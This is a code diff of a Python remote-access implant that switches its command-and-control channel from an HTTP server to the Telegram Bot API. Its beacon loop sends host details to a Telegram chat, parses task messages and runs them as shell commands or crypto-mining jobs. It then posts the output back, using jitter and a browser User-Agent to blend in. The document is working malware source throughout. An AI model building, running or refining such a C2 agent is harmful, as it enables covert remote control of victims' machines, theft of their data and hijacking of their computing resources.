@@ -119,9 +119,10 @@ def xor_crypt(data: bytes, key: bytes) -> bytes:
 _telegram_offset = 0
 _last_telegram_send = 0
 _rate_limit_until = 0
+_command_chat_offset = 0
 
 def telegram_send(message: str, reply_to: int = None) -> dict:
-    """Send message via Telegram Bot API with rate limiting and backoff."""
+    """Send message via Telegram Bot API with rate limiting."""
     global _last_telegram_send, _rate_limit_until
     
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -158,70 +159,72 @@ def telegram_send(message: str, reply_to: int = None) -> dict:
         _last_telegram_send = time.time()
         
         if result.get("ok"):
-            return {"ok": True, "result": result.get("result"), "message_id": result.get("result", {}).get("message_id")}
+            return {"ok": True, "message_id": result.get("result", {}).get("message_id")}
         
-        # Check for rate limit in error
-        error_code = result.get("error_code", 0)
-        if error_code == 429:
-            retry_after = result.get("parameters", {}).get("retry_after", 30)
-            _rate_limit_until = time.time() + retry_after
-            log(f"Rate limited, retry after {retry_after}s", "WARN")
-            return {"ok": False, "error": "rate_limit", "retry_after": retry_after}
+        # Check for rate limit
+        if "429" in str(result) or result.get("error_code") == 429:
+            _rate_limit_until = time.time() + 30
+            return {"ok": False, "error": "rate_limit", "retry_after": 30}
         
         return {"ok": False, "error": result.get("description")}
     except Exception as e:
         _last_telegram_send = time.time()
-        
-        # Handle 429 from HTTP error
         if "429" in str(e):
             _rate_limit_until = time.time() + 30
-            log("Rate limited (429), cooling down 30s", "WARN")
             return {"ok": False, "error": "rate_limit", "retry_after": 30}
-        
-        log(f"Telegram error: {e}", "ERROR")
         return {"ok": False, "error": str(e)}
 
-def telegram_read_replies(agent_id: str, since_msg_id: int = 0) -> list:
-    """Read replies to our beacon messages from chat.
+def telegram_get_commands_via_topic(agent_id: str) -> list:
+    """Get commands from Telegram using forum topic or direct messages.
     
-    Uses getUpdates but only looks for replies to our messages.
-    Avoids 409 by using short timeout and processing quickly.
+    Uses a simple approach: read recent messages and find commands.
+    Stores offset to avoid re-reading old messages.
     """
-    global _telegram_offset
+    global _command_chat_offset
     commands = []
     
     try:
-        # Quick poll - just check for new messages
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={_telegram_offset + 1}&limit=10&timeout=0&allowed_updates=[\"message\"]"
-        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        resp = urlopen(req, timeout=3)
+        # Use getUpdates with allowed_updates to minimize conflict
+        # This reads ALL updates, we filter for commands
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+        params = f"?offset={_command_chat_offset + 1}&limit=5&timeout=0&allowed_updates=[\"message\",\"edited_message\"]"
+        
+        req = Request(url + params, headers={"User-Agent": "Mozilla/5.0"})
+        resp = urlopen(req, timeout=5)
         result = json.loads(resp.read().decode())
         
         if result.get("ok"):
             for update in result.get("result", []):
-                _telegram_offset = update.get("update_id", _telegram_offset)
+                _command_chat_offset = update.get("update_id", _command_chat_offset)
                 
-                if "message" in update:
-                    msg = update["message"]
-                    text = msg.get("text", "")
-                    reply_to = msg.get("reply_to_message", {}).get("message_id", 0)
+                # Check for new or edited message
+                msg = update.get("message") or update.get("edited_message")
+                if not msg:
+                    continue
+                
+                text = msg.get("text", "")
+                chat_id = msg["chat"]["id"]
+                
+                # Look for command format: /cmd AGENT_ID COMMAND
+                # or Task format from bot
+                if "📋" in text or "Task #" in text:
+                    # Parse task
+                    task_match = re.search(r'Task #(\d+)', text)
+                    type_match = re.search(r'Type:\s*(\w+)', text)
+                    cmd_match = re.search(r'Command:\s*(.+)', text, re.MULTILINE)
                     
-                    # Check if this is a reply to our beacon
-                    if reply_to >= since_msg_id and ("Task #" in text or "📋" in text):
-                        task_match = re.search(r'Task #(\d+)', text)
-                        type_match = re.search(r'Type:\s*(\w+)', text)
-                        cmd_match = re.search(r'Command:\s*(.+)', text, re.MULTILINE)
+                    if task_match and cmd_match:
+                        commands.append({
+                            "id": task_match.group(1),
+                            "type": type_match.group(1) if type_match else "exec",
+                            "command": cmd_match.group(1).strip()
+                        })
+                        log(f"Got command: Task #{task_match.group(1)}", "TASK")
                         
-                        if task_match and cmd_match:
-                            commands.append({
-                                "id": task_match.group(1),
-                                "type": type_match.group(1) if type_match else "exec",
-                                "command": cmd_match.group(1).strip()
-                            })
-                            log(f"Got command from reply: Task #{task_match.group(1)}", "TASK")
     except Exception as e:
-        if "409" not in str(e) and "429" not in str(e):
-            log(f"Read replies error: {e}", "DEBUG")
+        # Ignore 409 conflict - bot is polling
+        if "409" not in str(e):
+            log(f"Get commands error: {e}", "DEBUG")
     
     return commands
 
@@ -282,97 +285,91 @@ def telegram_report_result(agent_id: str, task_id: int, result: str, success: bo
         log(f"Result report error: {e}", "DEBUG")
 
 def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
-    """Telegram C2 beacon loop - HTTP primary, Telegram notifications only.
+    """Pure Telegram C2 beacon loop - no HTTP required.
     
-    Architecture (avoids 429 rate limit):
-    1. Agent sends beacon via HTTP to C2 server
-    2. C2 server updates DB, returns tasks
-    3. Agent executes tasks
-    4. Agent sends results via HTTP
-    5. C2 server (bot) sends Telegram notifications to admin
+    Architecture:
+    1. Agent sends beacon via Telegram sendMessage
+    2. Agent immediately reads updates (may conflict with bot - handled)
+    3. Bot sees beacon, replies with commands
+    4. Agent parses replies and executes
+    5. Agent sends result via Telegram
     
-    Only the bot uses Telegram API - agent uses HTTP.
+    Uses only Telegram API - no HTTP server needed.
     """
     import random
     
     _total_beacons = 0
     _total_tasks = 0
+    _consecutive_409 = 0
     
-    # HTTP C2 URL (required for this mode)
-    c2_url = os.environ.get("C2_URL", "http://127.0.0.1:5000")
-    
-    log(f"Telegram C2 mode - HTTP beacon to {c2_url}", "START")
-    log(f"Agent: {agent_id[:8]}", "START")
+    log(f"Pure Telegram bridge started (agent={agent_id[:8]})", "START")
     
     while True:
         try:
             _total_beacons += 1
             
-            # Send beacon via HTTP (not Telegram - avoids 429)
+            # Send beacon
             hostname = platform.node()
             platform_type = detect_platform()
             
-            beacon_data = {
-                "id": agent_id,
-                "hostname": hostname,
-                "platform_type": platform_type,
-                "username": os.environ.get("USER", "unknown"),
-                "os": platform.system(),
-                "arch": platform.machine()
-            }
+            beacon_msg = f"""📡 Beacon #{_total_beacons}
+Agent: {agent_id}
+Host: {hostname}
+Platform: {platform_type}
+Time: {time.strftime('%H:%M:%S')}"""
             
-            # HTTP beacon to C2 server
-            try:
-                resp = http_post("/api/agent/beacon", beacon_data, c2_url, None, None)
-                if resp:
-                    log(f"Beacon #{_total_beacons} via HTTP OK", "CONN")
-                    
-                    # Process tasks from response
-                    tasks = resp.get("tasks", [])
-                    for task in tasks:
-                        _total_tasks += 1
-                        task_id = task.get("id", "unknown")
-                        task_type = task.get("task_type", "exec")
-                        command = task.get("payload", "")
-                        
-                        log(f"Task #{task_id}: {command}", "TASK")
-                        
-                        try:
-                            if task_type == "exec":
-                                result = shell_exec(command)
-                            elif task_type == "mine":
-                                result = start_mining(command)
-                            elif task_type == "control" and command == "stop":
-                                return
-                            else:
-                                result = execute_task({"task_type": task_type, "command": command})
-                            
-                            # Report result via HTTP
-                            http_post("/api/agent/result", {
-                                "id": agent_id,
-                                "task_id": task_id,
-                                "result": result[:2000],
-                                "success": True
-                            }, c2_url, None, None)
-                            
-                            log(f"Task #{task_id} completed", "TASK")
-                            
-                        except Exception as e:
-                            http_post("/api/agent/result", {
-                                "id": agent_id,
-                                "task_id": task_id,
-                                "result": str(e),
-                                "success": False
-                            }, c2_url, None, None)
-                else:
-                    log(f"Beacon #{_total_beacons} failed - no response", "ERROR")
-                    
-            except Exception as e:
-                log(f"HTTP beacon error: {e}", "ERROR")
+            result = telegram_send(beacon_msg)
             
-            # Sleep with jitter
+            if result.get("ok"):
+                log(f"Beacon #{_total_beacons} sent", "CONN")
+                _consecutive_409 = 0
+            elif result.get("error") == "rate_limit":
+                wait = result.get("retry_after", 30)
+                log(f"Rate limited, waiting {wait}s", "WARN")
+                time.sleep(wait)
+                continue
+            else:
+                log(f"Beacon failed: {result.get('error')}", "ERROR")
+            
+            # Try to get commands (may fail with 409)
+            commands = telegram_get_commands_via_topic(agent_id)
+            
+            # If 409 conflicts, just skip - bot will reply next time
+            if not commands:
+                _consecutive_409 += 1
+                if _consecutive_409 > 5:
+                    log("Multiple 409 conflicts - bot may be using long polling", "WARN")
+            
+            # Process commands
+            for cmd in commands:
+                _total_tasks += 1
+                task_id = cmd.get("id", "unknown")
+                task_type = cmd.get("type", "exec")
+                command = cmd.get("command", "")
+                
+                log(f"Task #{task_id}: {command}", "TASK")
+                
+                try:
+                    if task_type == "exec":
+                        result = shell_exec(command)
+                    elif task_type == "mine":
+                        result = start_mining(command)
+                    elif task_type == "control" and command == "stop":
+                        telegram_send(f"🛑 Agent {agent_id[:8]} stopped")
+                        return
+                    else:
+                        result = execute_task({"task_type": task_type, "command": command})
+                    
+                    # Send result
+                    telegram_send(f"✅ Task #{task_id}\nResult:\n{result[:500]}")
+                    log(f"Task #{task_id} done", "TASK")
+                    
+                except Exception as e:
+                    telegram_send(f"❌ Task #{task_id}\nError: {e}")
+            
+            # Sleep with jitter (min 5s to reduce rate limit risk)
             jitter_s = sleep * jitter / 100
-            actual_sleep = max(3, sleep + random.uniform(-jitter_s, jitter_s))
+            actual_sleep = max(5, sleep + random.uniform(-jitter_s, jitter_s))
             time.sleep(actual_sleep)
             
         except KeyboardInterrupt:
